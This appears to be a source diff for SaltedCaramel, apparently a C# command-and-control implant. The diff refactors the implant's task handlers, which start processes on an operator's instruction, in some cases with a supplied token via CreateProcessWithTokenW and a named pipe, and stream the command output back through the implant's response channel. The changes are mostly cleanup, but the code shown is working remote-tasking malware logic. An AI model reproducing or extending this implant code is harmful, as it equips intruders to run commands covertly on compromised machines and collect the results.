@@ -47,8 +47,7 @@ namespace SaltedCaramel.Tasks
                 argString = string.Join(" ", split.Skip(1).ToArray());
                 file = split[0];
             }
-            // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
-            Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
+
             // STARTUPINFO is used to control a few startup options for our new process
             Win32.STARTUPINFO startupInfo = new Win32.STARTUPINFO();
             // Use C:\Temp as directory to ensure that we have rights to start our new process
@@ -106,6 +105,9 @@ namespace SaltedCaramel.Tasks
                     throw new Exception("Error connecting to named pipe server.");
                 }
 
+                // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
+                Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
+
                 // Finally, create our new process
                 bool createProcess = Win32.CreateProcessWithTokenW(
                     TokenHandle,            // hToken
@@ -144,8 +146,7 @@ namespace SaltedCaramel.Tasks
                                     {
                                         message = reader.ReadLine();
                                     }
-                                    catch (Exception e)
-                                    {
+                                    catch                                    {
                                         // Fail silently if reader no longer exists
                                         // May happen if long running job times out?
                                     }
@@ -237,45 +238,49 @@ namespace SaltedCaramel.Tasks
         {
             string[] split = task.@params.Trim().Split(' ');
             string argString = string.Join(" ", split.Skip(1).ToArray());
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.FileName = split[0];
-            startInfo.Arguments = argString;
-            startInfo.UseShellExecute = false;
-            startInfo.RedirectStandardOutput = true; // Ensure we get standard output
-            startInfo.CreateNoWindow = true; // Don't create a new window
-
-            Process proc = new Process();
-            proc.StartInfo = startInfo;
-
-            try
+            ProcessStartInfo startInfo = new ProcessStartInfo
             {
-                Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
-                proc.Start();
+                FileName = split[0],
+                Arguments = argString,
+                UseShellExecute = false,
+                RedirectStandardOutput = true, // Ensure we get standard output
+                CreateNoWindow = true // Don't create a new window
+            };
 
-                List<string> procOutput = new List<string>();
-                SCTaskResp response;
+            using (Process proc = new Process())
+            {
+                proc.StartInfo = startInfo;
 
-                while (!proc.StandardOutput.EndOfStream)
+                try
                 {
-                    string line = proc.StandardOutput.ReadLine();
-                    procOutput.Add(line);
-                    if (procOutput.Count >= 5)
-                    {
-                        response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
-                        implant.PostResponse(response);
-                        procOutput.Clear();
-                    }
-                }
+                    Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
+                    proc.Start();
 
-                proc.WaitForExit();
-                task.status = "complete";
-                task.message = JsonConvert.SerializeObject(procOutput);
-            }
-            catch (Exception e)
-            {
-                Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
-                task.status = "error";
-                task.message = e.Message;
+                    List<string> procOutput = new List<string>();
+                    SCTaskResp response;
+
+                    while (!proc.StandardOutput.EndOfStream)
+                    {
+                        string line = proc.StandardOutput.ReadLine();
+                        procOutput.Add(line);
+                        if (procOutput.Count >= 5)
+                        {
+                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
+                            implant.PostResponse(response);
+                            procOutput.Clear();
+                        }
+                    }
+
+                    proc.WaitForExit();
+                    task.status = "complete";
+                    task.message = JsonConvert.SerializeObject(procOutput);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
+                    task.status = "error";
+                    task.message = e.Message;
+                }
             }
         }
     }
